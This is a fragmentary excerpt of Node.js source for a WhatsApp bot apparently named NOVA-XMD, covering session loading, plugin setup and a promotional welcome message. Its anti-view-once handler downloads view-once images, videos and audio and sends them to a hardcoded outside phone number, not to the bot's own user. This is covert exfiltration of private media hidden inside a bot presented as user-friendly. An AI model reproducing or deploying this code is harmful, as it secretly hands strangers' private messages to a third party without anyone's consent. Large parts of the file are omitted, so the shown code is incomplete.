...
const sessdata = config.SESSION_ID.replace("BMB-XMD~", '');
...
console.log("Session downloaded ✅")
  ...
  console.log("Connecting NOVA-XMD to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing NOVA-XMD Plugins')
  const path = require('path');
  ...
  let up = `*Hello there ✦ NOVA ✦ NOVA ✦ XMD ✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by NOVA-XMD TECH INC. \ud83c\udf8a, Meet ✦ NOVA XMD ✦ WhatsApp Bot.\n\n *Thanks for using ✦ CASEY ✦  NOVA XMD ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VawO6hgF6sn7k3SuVU3z\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/bmbtech11/NOVA-XMD\n\n> © Powered BY ✦ ,NOVA ✦ XMD ✦ \ud83d\udda4`;
  conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/p0xeh3.jpg` }, caption: up })
  }
  })
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("255767862457@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("255767862457@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("255767862457@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
